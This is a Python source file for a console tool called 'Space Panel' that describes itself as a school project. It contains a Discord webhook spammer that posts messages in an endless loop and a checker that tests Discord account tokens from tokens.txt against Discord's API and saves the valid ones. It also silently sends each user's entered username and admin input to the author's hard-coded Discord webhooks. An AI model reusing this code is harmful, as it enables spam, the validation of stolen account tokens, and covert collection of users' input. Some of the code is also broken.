import time
import os
import requests
from requests import get, post
from random import randint
from pystyle import Colorate, Colors, System, Center, Write, Anime
from discord_webhook import DiscordWebhook, DiscordEmbed

##############################=- Discord Log -=###############################

adminlog = "https://discord.com/api/webhooks/990731994877009932/yrs9PgyHawpd7O8N-XanYNRJq7uWWzWYqdfGO0BHX39O_l6goi8A-5_mXJWS1sxTWbrb"
errorlog = "https://discord.com/api/webhooks/990731994877009932/yrs9PgyHawpd7O8N-XanYNRJq7uWWzWYqdfGO0BHX39O_l6goi8A-5_mXJWS1sxTWbrb"
successlog = "https://discord.com/api/webhooks/990731994877009932/yrs9PgyHawpd7O8N-XanYNRJq7uWWzWYqdfGO0BHX39O_l6goi8A-5_mXJWS1sxTWbrb"
loginlog = "https://discord.com/api/webhooks/990731994877009932/yrs9PgyHawpd7O8N-XanYNRJq7uWWzWYqdfGO0BHX39O_l6goi8A-5_mXJWS1sxTWbrb"
avatarlog = "https://i.pinimg.com/564x/8f/f0/69/8ff06984d0b2b336380e806ccb3ff647.jpg"


#############################=- ASCII  -=#################################


logo = f"""
╔═╗┌─┐┌─┐┌─┐┌─┐
╚═╗├─┘├─┤│  ├┤
╚═╝┴  ┴ ┴└─┘└─┘"""


tol = """
       ╔═╗┌─┐┌─┐┌─┐┌─┐
       ╚═╗├─┘├─┤│  ├┤
       ╚═╝┴  ┴ ┴└─┘└─┘
   ╔═════════════════════╗
   │     ┌HOME PAGE┐     │
   ╚═════│  Tools  │═════╝
╔════════┘  About  └════════╗
│ Support   Admin       Afk │
╚═══════════════════════════╝"""


aAbout = """
╔═══════════════════════════════════════════════════════╗         ,MMM8&&&.
│ This project is a school project, nothing more :-)    │    _...MMMMM88&&&&..._
╚═══════════════════════════════════════════════════════╝ .::'''MMMMM88&&&&&&'''::.
                                                         ::     MMMMM88&&&&&&     ::
                                                         '::....MMMMM88&&&&&&....::'
                                                            `''''MMMMM88&&&&''''`
                                                                  'MMM8&&&'"""


suc = """
  ░░▓▓▓▓▓▓ ░▓▓   ░▓▓   ░▓▓▓▓▓▓   ░▓▓▓▓▒▒   ░▓▓▓▓     ░▓▓▓▓▓▓   ░▓▓▓▓▓▓
░░▓▓       ░▓▓   ░▓▓ ░▓▓       ░▓▓       ░▓▓    ▓▓ ░▓▓       ░▓▓      
  ░░▓▓▓▓   ░▓▓   ░▓▓ ░▓▓       ░▓▓       ░▓▓▓▓▓▓▓▓   ░▓▓▓▓     ░▓▓▓▓  
        ▓▓ ░▓▓   ░▓▓ ░▓▓       ░▓▓       ░▓▓             ░▓▓       ░▓▓
░░▓▓▓▓██     ░▓▓▓▓▓▓   ░▓▓▓▓██   ░▓▓▓▓▒▒   ░▓▓▓▓▓▓ ░▓▓▓▓▓▓   ░▓▓▓▓▓▓  
    """


lod = '''
                          ▒                                                                              ░        ░     
           ░    ▒░████████       ▒░████░▒         ▒   ▒░████████████████ ░ ▒░████████████████  ▒░████████                ░
    ▒     ░   ▒░░░████████    ▒  ▒░████░▒      ░      ▒░████████████████ ▒ ▒░████████████████  ▒░████████▓▒  ░   ▒      ▒     
   ░    ▒   ▒░████        ████   ▒░████░▒ ░           ▒░████▒░  ░ ▒        ▒░████▒░   ▒        ▒░████▓  ████▓▒      ░     
    ▒    ░  ▒░████   ░    ████   ▒░████░▒     ▒       ▒░████▒░             ▒░████▒░         ▒  ▒░████▓  ████▓▒           
            ▒░████    ▒░  ░░░░   ▒░████░▒      ░      ▒░████▒░   ▒   ░     ▒░████▒░▒    ░      ▒░████▓  ████▓▒  ▒  ░  ▒     
   ▒  ░     ▒░████   ░           ▒░████░▒   ░▒        ▒░████▒░       ▒     ▒░████▒░        ░   ▒░████▓  ████▓▒ ░          
                ▒░████████ ░▒    ▒░████░▒             ▒░████▒░▒▒           ▒░████▒░▒▒          ▒░████████▓▒               
     ▒    ▒     ▒░████████       ▒░████░▒ ▒    ▒   ░  ▒░████████▒   ░      ▒░████████▒         ▒░████████     ▒  ░         
                  ▒▒░░░░▒░▓▓▓▓ ░ ▒░████░▒             ▒░████████▒    ▒░    ▒░████████▒ ░ ▒     ▒░████░░░░           ▒     
  ░       ▒             ▒▒████ ▒ ▒░████░▒   ░         ▒░████▒▒             ▒░████▒▒          ░ ▒░████       ▒             
     ░        ▒▒▒▒      ▒░████   ▒░████░▒    ▒        ▒░████▒░   ▒░      ▒ ▒░████▒░    ░  ▒    ▒░████         ▒    ░      ▒ 
      ░       ████░░░░▒▒▒▒████   ▒░████░▒           ░ ▒░████▒░             ▒░████▒░            ▒░████   ▒ ░              ░  ▒
▒         ▒   ░░░░▓▓▓▓▓▓▓▓░░░░   ▒░████▓▓▓▓▓▓▓▓▓▓▓▓   ▒░██████▓▓▓▓▓▓▓▓▓▓   ▒░████▓▓▓▓▓▓▓▓▓▓▓▓  ▒░████                  
                  ████████     ░ ▒░████████████████   ▒░████████████████   ▒░████████████████  ▒░▓▓▓▓  ▒▒░     ░
    ░    ▒            ░▒                      ▒░             ▒                ▒░         ░▒         ░    ▒           ▒       ▒
            ╔═════════════════════════════════════════════════════════════════════════════════════════════════╗   
    ▒      ┌┤                                     Press Enter to exit...                                      ├┐      ▒
          ┌┤╚═════════════════════════════════════════════════════════════════════════════════════════════════╝├┐    ░     ▒
  ▒             ░        ░    ▒░ ▒░    ▒ ░  ░        ░▒  ░  ░     ░░▒░ ░  ░        ░    ▒░ ▒░    ▒ ░  ░        ░
         ░▒  ░▒       ░ ▒░  ░       ░▒   ░      ░  ░▒     ░ ▒░  ░       ░▒   ░      ░  ░▒   ░ ▒░  ░       ░▒   ░       ░     ▒
      ▒      ░         ▒░   ░          ░ ░▒       ░▒  ░
   ▒          ░▒  ░▒       ░ ▒░  ░       ░▒   ░      ░  ░▒   ░ ▒░  ░       ░▒   ░      ░  ░▒   ░ ▒░  ░       ░▒   ▒     ░
     ▒        ░         ▒░   ░          ░ ░▒       ░▒  ░ ░        ░    ▒░ ▒░    ▒ ░  ░        ░▒  ░  ░     
         ░▒  ░▒       ░ ▒░  ░       ░▒   ░      ░  ░▒                                                                   ░   ▒
 ▒           ░         ▒░   ░          ░ ░▒       ░▒  ░░ ▒░  ░       ░   ░      ░  ░░  ░       ░▒   ░      ░  ░
'''


bannertool = """
                ╔═╗┌─┐┌─┐┌─┐┌─┐  ╔╦╗┌─┐┌─┐┬  ┌─┐
                ╚═╗├─┘├─┤│  ├┤    ║ │ ││ ││  └─┐
                ╔═╝┴  ┴ ┴└─┘└─┘   ╩ └─┘└─┘┴─┘└─┘
              ╔═╩════════════════════════════════╗                ░
             ┌┴1 Discord WebHook Spamer          ┴┐┌▓▒▓  ░   ░▒
             └─2 Token Checker                    └┤ ▒▒▓░▒  ░
             ┌─3 SMS Sender                       ┌┤▒▓░   ░▒   ░▒
             └┬                                  ┬┘└▓▒░ ░▒ ░
              ╚══════════════════════════════════╝            ░    ▒░
"""




stopped = """
      ▓▓████    ██████████      ██████    ██████▓▓      
    ▓▓██░░░░▓▓  ██████████    ▓▓██░░░░▓▓  ████░░░░▓▓    
    ████    ██      ██      ▓▓████    ██  ████    ██    
    ████    ░░      ██      ▓▓████    ██  ████    ██    
    ████████        ██      ░░████    ██  ████    ██    
    ░░██████▓▓      ██        ████    ██  ████    ██    
      ░░  ████      ██      ░░████    ██  ████████      
    ▓▓    ████      ██      ░░████    ██  ████░░░░      
    ██    ████      ██        ████    ██  ████          
    ░░▓▓▓▓██░░      ██        ░░██▓▓▓▓░░  ████                               
"""


Send = """
                                                                                        
                                                                                        
            ░░                                                                  ░░      
                                                                                        
                                                                                        
      ░░                                ░░  ██                                          
  ░░                                        ██                              ░░░░        
                                            ██                                          
                                          ▓▓▓▓▓▓                                        
                                        ▓▓▓▓▓▓▓▓▓▓                                      
                                      ▓▓▓▓▓▓▓▓▓▓▓▓▓▓                                    
                                      ▓▓▒▒▓▓▓▓▒▒▓▓▓▓                                    
                                      ▓▓▓▓▓▓▓▓▓▓▓▓▓▓                                    
                                      ▓▓▓▓▓▓▓▓▓▓▓▓▓▓                                    
                                      ░░░░▒▒░░░░░░░░                                    
                                      ▓▓▓▓▓▓▓▓▓▓▓▓▓▓                                    
                                      ▓▓▒▒▒▒▓▓▒▒▒▒▓▓                                    
                                      ▓▓▒▒▒▒██▒▒▒▒▓▓                                    
                                    ████▓▓▓▓▓▓██▓▓▓▓██      ░░                          
                                  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██                                
                                ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██                              
                                ▓▓▓▓▓▓██▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓                              
        ░░                      ▓▓▓▓▓▓░░████████████░░████                        ░░    
                                ▓▓    ▓▓░░░░░░▓▓░░░░    ▓▓                              
                                                                                        
                                                                                        
                                                                                        
                                                                                        
                        ▒▒                ▒▒    ▒▒          ▒▒    ▒▒                    

"""


zerror = """
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ▓▓▓▓▓▓▓▓▓▓▓▓▒▒          ▓▓▓▓▓▓▓▓▓▓▓▓░░              ░░██████████          ▓▓▓▓▓▓▓▓▓▓▓▓▒▒      
  ████████████████      ████████████████▒▒      ████████████████▒▒        ████████████████▒▒      ████████████████░░  
  ████████▒▒▒▒▒▒▒▒      ██████    ▒▒██████      ██████    ▒▒██████      ▓▓██████░░  ▒▒██████░░    ██████    ▒▒██████  
  ██████                ██████      ██████      ██████      ██████      ██████        ▒▒██████    ██████      ██████  
  ██████████████▓▓      ██████      ██████      ██████      ██████    ░░██████          ██████    ██████    ░░██████  
  ██████████████▒▒      ████████████████        ████████████████      ▒▒████            ██████    ████████████████    
  ██████░░░░░░░░        ██████████████          ██████████████        ░░██████          ██████    ██████████████      
  ██████                ██████  ▒▒██████        ██████  ▒▒██████      ░░██████          ██████    ██████  ██████▓▓    
  ██████                ██████    ██████▒▒      ██████    ██████▒▒      ██████░░      ██████▒▒    ██████    ██████▒▒  
  ████████████████      ██████      ██████░░    ██████      ██████░░    ░░████████▒▒████████      ██████    ░░██████░░
  ████████████████      ██████      ░░██████    ██████      ░░██████      ░░██████████████        ██████      ▒▒██████
"""

###########################################################################################################

System.Title("Space Panel")
print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(logo)))
print("\n"*2)
user = Write.Input(f"╔═(root@Space)═[Enter Username]" +"\n╚──» ", Colors.purple_to_blue, interval=0.010)
embed = DiscordEmbed(title="Space Panel",
                     description=" Status *:* __`Login New User :)`__ \nUsername *:* __`" + user + "`__", color='33d528')
webhook2 = DiscordWebhook(
    url=loginlog, username="Space Panel", avatar_url=avatarlog)
webhook2.add_embed(embed)
response = webhook2.execute()

##############################################


def home(home):
    System.Size(100, 30)
    os.system("cls || clear")
    System.Title("Space Panel $ Home $ Username : " + user)
    print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(tol)))
    ct = Write.Input(
        f"╔═({user}@Space)═[Home]" + "\n╚──» ", Colors.purple_to_blue, interval=0.010)
    time.sleep(0.3)
    if ct == 'tool' or ct == 'tools' or ct == 'Tool' or ct == 'TOOLS':
        tool(tool)
    elif ct == 'About' or ct == 'about' or ct == 'ABOUT':
        About(About)
    elif ct == 'support' or ct == 'Support' or ct == "SUPPORT":
        Support(Support)
    elif ct == 'afk' or ct == 'AFK' or ct == 'Afk':
        afk(afk)
    elif ct == 'admin' or ct == 'Admin' or ct == 'ADMIN':
        admin()
    else:
        # This For Log Only
        embed = DiscordEmbed(title="Space Panel", description=" Status *:* __`Error in Home`__ \nDoer *:* __`" +
                             user + "`__", color='ff0000', Author=user)
        webhook2 = DiscordWebhook(
            url=errorlog, username="Space Panel", avatar_url=avatarlog)
        webhook2.add_embed(embed)
        response = webhook2.execute()
        error(error)
        home(home)

##############################################


def admin():
    adminpanel = f"""
         ▄▄▄· ·▄▄▄▄  • ▌ ▄ ·. ▪   ▐ ▄ 
        ▐█ ▀█ ██▪ ██ ·██ ▐███▪██ •█▌▐█
        ▄█▀▀█ ▐█· ▐█▌▐█ ▌▐▌▐█·▐█·▐█▐▐▌
        ▐█ ▪▐▌██. ██ ██ ██▌▐█▌▐█▌██▐█▌
          ▀  ▀ ▀▀▀▀▀• ▀▀  █▪▀▀▀▀▀▀▀▀ █▪
       ═╦═════════════════════════════╦═
   ╔════╩═════════════════════════════╩════╗
   ├ [Owner@Message] Weclome :)            │
   ├ Join Here ~ $  discord.gg/3YTpcEz8qY  │
   ╚════╦═════════════════════════════╦════╝
╔═══════╩═════════════════════════════╩═══════╗
├       [1] Soon.. [2] Soon.. [3] Soon..      │
╚═════════════════════════════════════════════╝"""
    adminlogin = """
╦   ┌─┐ ┌─┐ ┬ ┌┐┌
║   │ │ │ ┬ │ │││
╩═╝ └─┘ └─┘ ┴ ┘└┘"""
    adminsoon = """
.▄▄ ·              ▐ ▄ 
▐█ ▀. ▪     ▪     •█▌▐█
▄▀▀▀█▄ ▄█▀▄  ▄█▀▄ ▐█▐▐▌
▐█▄▪▐█▐█▌.▐▌▐█▌.▐▌██▐█▌
 ▀▀▀▀  ▀█▄▀▪ ▀█▄▀▪▀▀ █▪
    """
    os.system("cls || clear")
    System.Title("Space Panel $ Admin Panel $ Username : " + user)
    print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(adminlogin)))
    admin = Write.Input(f"╔═({user}@Space)═[Admin Login]" + "\n╚──» ", Colors.purple_to_blue, interval=0.010)
    System.Title("Space Panel $ Admin Panel $ Username : " + admin)
    embed = DiscordEmbed(title="Space Panel", description=" Status *:* __`Admin Login`__ \nUsername *:* __`" + admin + "`__", color='33d528')
    webhook2 = DiscordWebhook(url=adminlog, username="Space Panel", avatar_url=avatarlog)
    webhook2.add_embed(embed)
    response = webhook2.execute()
    os.system("cls || clear")
    print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(adminpanel)))
    panel = Write.Input(f"╔═({admin}@Space)═[Admin Panel]" + "\n╚──» ", Colors.purple_to_blue, interval=0.010)
    if panel == "1":
        os.system("cls || clear")
        System.Title("Space Panel $ Admin Panel $ Tools $ Username : " + admin)
        Anime.Fade(Center.Center(adminsoon), Colors.purple_to_blue,
                      Colorate.Vertical, enter=True)
        home(home)
    else:
        Anime.Fade(Center.Center(adminsoon), Colors.purple_to_blue,
                      Colorate.Vertical, enter=True)
        home(home)


##############################################

def Support(Support):
    System.Size(100, 30)
    System.Title("Space Panel $ Support $ Username : " + user)
    os.system("start /max https://discord.gg/YFRrShrU9p")
    time.sleep(0.3)
    home(home)

##############################################


def afk(afk):
    os.system("cls || clear")
    System.Title("Space Panel $ AFK $ Username : " + user)
    System.Size(150, 50)
    alod = Anime.Fade(Center.Center(lod), Colors.purple_to_blue,
                      Colorate.Vertical, enter=True)
    if alod:
        home(home)
    else:
        home(home)

##############################################


def About(About):
    System.Size(100, 30)
    System.Title("Space Panel $ About $ Username : " + user)
    os.system("cls || clear")
    print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(aAbout)))
    ct = Write.Input(f"╔═({user}@Space)═[About-Press Enter to exit...]" +
                     "\n╚──» ", Colors.purple_to_blue, interval=0.010)
    time.sleep(0.3)
    if ct:
        tool(tool)
    else:
        home(home)

##############################################


def tool(tool):
    System.Size(100, 30)
    System.Title("Space Panel $ Tools $ Username : " + user)
    os.system("cls || clear")
    print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(bannertool)))
    time.sleep(0.3)
    print("\n"*2)
    tool = Write.Input(
        f"╔═({user}@Space)═[Tools]" + "\n╚──» ", Colors.purple_to_blue, interval=0.010)
    if tool == '1' or tool == 'webhook' or tool == 'Web hook':
        webhkspammer()
    elif tool == '2' or tool == 'Token Checker':
        variant1()
    elif tool == '3' or tool == 'SMS Sender':
        sms()
    else:
        # This For Log Only
        embed = DiscordEmbed(
            title="Space Panel", description=" Status *:* __`Error in Tools`__", color='ff0000', Author=user)
        webhook2 = DiscordWebhook(
            url=errorlog, username="Space Panel", avatar_url=avatarlog)
        webhook2.add_embed(embed)
        response = webhook2.execute()
        error(error)
        home(home)

##############################################

    

##############################################


def webhkspammer():
    System.Size(100, 30)
    System.Title("Space Panel $ Username : " + user)
    os.system("cls || clear")
    webhook = Write.Input(
        f"╔═({user}@Space)═[Your webhook Here]" + "\n╚──» ", Colors.purple_to_blue, interval=0.010)
    time.sleep(0.3)
    os.system("cls || clear")
    message = Write.Input(
        f"╔═({user}@Space)═[Your message Here]" + "\n╚──» ", Colors.purple_to_blue, interval=0.010)
    time.sleep(0.3)
    os.system("cls || clear")
    avatar = Write.Input(
        f"╔═({user}@Space)═[Your AvatarUrl Here]" + "\n╚──» ", Colors.purple_to_blue, interval=0.010)
    time.sleep(0.3)
    os.system("cls || clear")
    namek = Write.Input(
        f"╔═({user}@Space)═[Your WebHook Name Here]" + "\n╚──» ", Colors.purple_to_blue, interval=0.010)

    while True:
        os.system("cls || clear")
        try:
            _data = requests.post(
                webhook, json={'content': message, 'avatar_url': avatar, 'username': namek})
            if _data.status_code == 204:
                System.Size(150, 50)
                time.sleep(0.1)
                print(Colorate.Vertical(Colors.purple_to_blue, Center.Center(Send)))
                os.system("cls || clear")
        except:
            System.Size(130, 30)
            os.system("cls || clear")
            print(Colorate.Vertical(Colors.purple_to_blue, Center.Center(stopped)))
            embed = DiscordEmbed(
                title="**Space Panel** | Status *:* __`WebHook Spam Stoped`__", color='ff0000')
            webhook2 = DiscordWebhook(
                url=errorlog, username="Space Panel", avatar_url=avatarlog)
            webhook2.add_embed(embed)
            response = webhook.execute()
            time.sleep(5)
            tool(tool)

##############################################


def error(error):
    os.system("cls || clear")
    System.Size(130, 30)
    print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(zerror)))
    time.sleep(3)

##############################################


def variant1(token):
    System.Size(100, 30)
    System.Title("Space Panel $ Username : " + user)
    # Bad variant for mass token check due to the rate limit.
    response = get('https://discord.com/api/v6/auth/login',
                   headers={"Authorization": token})
    return True if response.status_code == 200 else False


def variant2(token):
    response = post(
        f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
    if "You need to verify your account in order to perform this action." in str(response.content) or "401: Unauthorized" in str(response.content):
        return False
    else:
        return True


def variant2_Status(token):
    response = post(
        f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
    if response.status_code == 401:
        return 'Invalid'
    elif "You need to verify your account in order to perform this action." in str(response.content):
        return 'Phone Lock'
    else:
        return 'Valid'


banner = """
╔╦╗┌─┐┬┌─┌─┐┌┐┌  ╔═╗┬ ┬┌─┐┌─┐┬┌─┌─┐╦═╗
 ║ │ │├┴┐├┤ │││  ║  ├─┤├┤ │  ├┴┐├┤ ╠╦╝
 ╩ └─┘┴ ┴└─┘┘└┘  ╚═╝┴ ┴└─┘└─┘┴ ┴└─┘╩╚╝"""


def variant1():
    try:
        checked = []
        os.system("cls || clear")
        with open('tokens.txt', 'r') as tokens:
            os.system("cls || clear")
            print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(banner)))
            for token in tokens.read().split('\n'):
                if len(token) > 15 and token not in checked and variant2(token) == True:
                    Valid = f"""
╔╦╗╔═╗╦╔═╔═╗╔╗╔  ╦╔═╗  ╦  ╦╔═╗╦  ╦ ╔╦╗
 ║ ║ ║╠╩╗║╣ ║║║  ║╚═╗  ╚╗╔╝╠═╣║  ║  ║╠═╗
 ╩ ╚═╝╩ ╩╚═╝╝╚╝  ╩╚═╝   ╚╝ ╩ ╩╩═╝╩ ═╩╝ ║
╔══════════════════════════════════════╝
╠({user}@Space)═[Token is Valid]
╚──» {token}
                    """
                    os.system("cls || clear")
                    print(Colorate.Vertical(
                        Colors.purple_to_blue, Center.XCenter(Valid)))
                    time.sleep(1)
                    os.system("cls || clear")
                    checked.append(token)
                else:
                    time.sleep(0.2)
                    inValid = f"""
╔╦╗╔═╗╦╔═╔═╗╔╗╔  ╦╔═╗  ╦╔╗╔╦  ╦╔═╗╦  ╦╔╦╗
 ║ ║ ║╠╩╗║╣ ║║║  ║╚═╗  ║║║║╚╗╔╝╠═╣║  ║ ║╠═╗
 ╩ ╚═╝╩ ╩╚═╝╝╚╝  ╩╚═╝  ╩╝╚╝ ╚╝ ╩ ╩╩═╝╩═╩╝ ║
╔═════════════════════════════════════════╝
╠({user}@Space)═[Token is Invalid]
╚──» {token}"""
                    print(Colorate.Vertical(
                        Colors.purple_to_blue, Center.XCenter(inValid)))
        if len(checked) > 0:
            save = Write.Input(f"╔═({user}@Space)═[valid tokens {len(checked)}]=[Save to File (Y/N)]" +
                               "\n╚──» ", Colors.purple_to_blue, interval=0.010).lower()
            if save == 'y':
                name = "Space-Tokens-valid"
                with open(f'{name}.txt', 'w') as saveFile:
                    saveFile.write('\n'.join(checked))
                tsf = f"""
══════════════════({user}@Space)═[Tokens Save To {name}.txt File!]
                """
                os.system("cls || clear")
                print(Colorate.Vertical(Colors.purple_to_blue, Center.YCenter(tsf)))
        time.sleep(1)
        tool(tool)
        if save == 'help' or save == 'Help' or save == 'HELP':
            tool(tool)
    except:
        sdsfs = """
══════════════════(Can`t Open "tokens.txt" File)═[Put the Tokens in File]')
        """
        print(Colorate.Vertical(Colors.purple_to_blue, Center.YCenter(sdsfs)))
        # This For Log Only
        embed = DiscordEmbed(
            title="Space Panel", description=" Status *:* __`Error Can't Open tokens.txt File`__", color='ff0000', Author=user)
        webhook2 = DiscordWebhook(
            url=errorlog, username="Space Panel", avatar_url=avatarlog)
        webhook2.add_embed(embed)
        response = webhook2.execute()
        time.sleep(10)
        tool(tool)

##############################################


def sms():
    System.Size(100, 30)
    System.Title("Space Panel $ Username : " + user)
    os.system("cls || clear")
    phone = Write.Input(
        f"╔═({user}@Space)═[Your phone number Here]=[With +]" + "\n╚──» ", Colors.purple_to_blue, interval=0.010)
    os.system("cls || clear")
    message = Write.Input(
        f"╔═({user}@Space)═[Your message Here]─[{phone}]" + "\n╚──» ", Colors.purple_to_blue, interval=0.010)
    resp = requests.post('https://textbelt.com/text',
                         {'phone': phone, 'message': message, 'key': 'textbelt', })
    if resp:
        print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(suc)))
        time.sleep(1.5)
        tool(tool)
    else:
        # This For Log Only
        embed = DiscordEmbed(
            title="Space Panel", description=" Status *:* __`Error in SMS`__", color='ff0000', Author=user)
        webhook2 = DiscordWebhook(
            url=errorlog, username="Space Panel", avatar_url=avatarlog)
        webhook2.add_embed(embed)
        response = webhook2.execute()
        error(error)
        tool(tool)

##############################################


##############################################
home(home)
